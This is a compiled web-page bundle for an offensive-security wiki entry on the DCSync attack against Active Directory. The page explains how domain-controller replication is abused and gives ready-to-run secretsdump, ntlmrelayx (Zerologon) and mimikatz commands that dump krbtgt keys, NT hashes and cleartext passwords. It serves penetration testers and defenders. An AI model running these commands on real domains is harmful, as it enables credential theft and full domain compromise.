import{_ as h,c as o,a5 as c,G as i,w as a,j as e,a as s,B as l,o as d}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"DCSync","description":"MITRE ATT&CK™ Sub-technique T1003.006","frontmatter":{"description":"MITRE ATT&CK™ Sub-technique T1003.006","authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/credentials/dumping/dcsync.md","filePath":"ad/movement/credentials/dumping/dcsync.md","lastUpdated":1724982529000}'),p={name:"ad/movement/credentials/dumping/dcsync.md"};function k(u,t,g,m,y,b){const n=l("PluginTabsTab"),r=l("PluginTabs");return d(),o("div",null,[t[2]||(t[2]=c('<h1 id="dcsync" tabindex="-1">DCSync <a class="header-anchor" href="#dcsync" aria-label="Permalink to &quot;DCSync&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>DCSync is a technique that uses Windows Domain Controller&#39;s API to simulate the replication process from a remote domain controller. This attack can lead to the compromise of major credential material such as the Kerberos <code>krbtgt</code> keys used legitimately for tickets creation, but also for <a href="./../../kerberos/forged-tickets/index">tickets forging</a> by attackers. The consequences of this attack are similar to an <a href="./ntds">NTDS.dit dump and parsing</a> but the practical aspect differ. A DCSync is not a simple copy &amp; parse of the NTDS.dit file, it&#39;s a <code>DsGetNCChanges</code> operation transported in an RPC request to the DRSUAPI (Directory Replication Service API) to replicate data (including credentials) from a domain controller.</p><p>This attack requires domain admin privileges to succeed (more specifically, it needs the following extended privileges: <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code>). Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. In some cases, over-privileged accounts can be abused to <a href="./../../dacl/grant-rights">grant controlled objects the right to DCSync</a>.</p><div class="tip custom-block"><p>A setting exists in the account policy or when creating users telling the domain controller to store the user&#39;s password using reversible encryption instead of irreversible hashing. This allows attackers to retrieve the passwords in clear-text.</p></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>',6)),i(r,null,{default:a(()=>[i(n,{label:"UNIX-like"},{default:a(()=>t[0]||(t[0]=[e("p",null,[s("On UNIX-like systems, this attack can be carried out with "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",target:"_blank",rel:"noreferrer"},"secretsdump"),s(" which has the ability to run this attack on an elevated context obtained through "),e("a",{href:"./../bruteforcing/stuffing"},"plaintext password stuffing"),s(", "),e("a",{href:"./../../ntlm/pth"},"pass-the-hash"),s(" or "),e("a",{href:"./../../kerberos/ptt"},"pass-the-ticket"),s(".")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# using a plaintext password")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'something'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with Pass-the-Hash")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'something'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash':'NThash'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER'@'DOMAINCONTROLLER'")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with Pass-the-Ticket")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'something'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER'@'DOMAINCONTROLLER'")])])])],-1),e("p",null,"The secretsdump script creates the following files.",-1),e("table",{tabindex:"0"},[e("thead",null,[e("tr",null,[e("th",null,"File"),e("th",null,"Content")])]),e("tbody",null,[e("tr",null,[e("td",null,".ntds"),e("td",null,"LM and NT password hashes")]),e("tr",null,[e("td",null,".cleartext"),e("td",null,"Passwords stored using reversible encryption")]),e("tr",null,[e("td",null,".kerberos"),e("td",null,"Kerberos keys (DES, AES128 and AES256)")]),e("tr",null,[e("td",null,".sam"),e("td",null,[s("Domain controller's "),e("a",{href:"./sam-and-lsa-secrets"},"SAM secrets")])]),e("tr",null,[e("td",null,".secrets"),e("td",null,[s("Domain controller's "),e("a",{href:"./sam-and-lsa-secrets"},"LSA secrets")])])])],-1),e("p",null,[s("This attack can also be operated with a "),e("a",{href:"./../../ntlm/relay"},"relayed NTLM authentication"),s(", but only if the target domain controller is vulnerable to "),e("a",{href:"./../../netlogon/zerologon"},"Zerologon"),s(" since the DRSUAPI always requires signing.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# target vulnerable to Zerologon, dump DC's secrets only")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dcsync://'DOMAINCONTROLLER'")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# target vulnerable to Zerologon, dump Domain's secrets")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dcsync://'DOMAINCONTROLLER'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -auth-smb"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'")])])])],-1)])),_:1}),i(n,{label:"Windows"},{default:a(()=>t[1]||(t[1]=[e("p",null,[s("On Windows, "),e("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"mimikatz"),s(" (C) can be used "),e("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync",target:"_blank",rel:"noreferrer"},[e("code",null,"lsadump::dcsync")]),s(" to operate a DCSync and recover the "),e("code",null,"krbtgt"),s(" keys for a "),e("a",{href:"./../../kerberos/forged-tickets/golden"},"golden ticket attack"),s(" for example. For this attack to work, the following mimikatz command should run in an elevated context (i.e. through runas with plaintext password, "),e("a",{href:"./../../ntlm/pth"},"pass-the-hash"),s(" or "),e("a",{href:"./../../kerberos/ptt"},"pass-the-ticket"),s(").")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extract a specific user, in this case the krbtgt")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::dcsync"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /dc:"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainController "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/domain:"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:krbtgt")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Dump everything (printed in a short and readable format)")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::dcsync"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /dc:"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainController "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/domain:"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/all"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /csv")])])])],-1)])),_:1})]),_:1}),t[3]||(t[3]=e("div",{class:"tip custom-block"},[e("p",null,[s("For an undocumented reason, Impacket's secretsdump relies on SMB before doing a DCSync (hence requiring a "),e("code",null,"CIFS/domaincontroller"),s(" SPN when using Kerberos tickets) while Mimikatz relies on LDAP before doing the DCSync (hence requiring a "),e("code",null,"LDAP/domaincontroller"),s(" SPN when using Kerberos tickets)")])],-1)),t[4]||(t[4]=e("h2",{id:"resources",tabindex:"-1"},[s("Resources "),e("a",{class:"header-anchor",href:"#resources","aria-label":'Permalink to "Resources"'},"​")],-1)),t[5]||(t[5]=e("p",null,[e("a",{href:"https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync",target:"_blank",rel:"noreferrer"},"https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync")],-1))])}const f=h(p,[["render",k]]);export{C as __pageData,f as default};
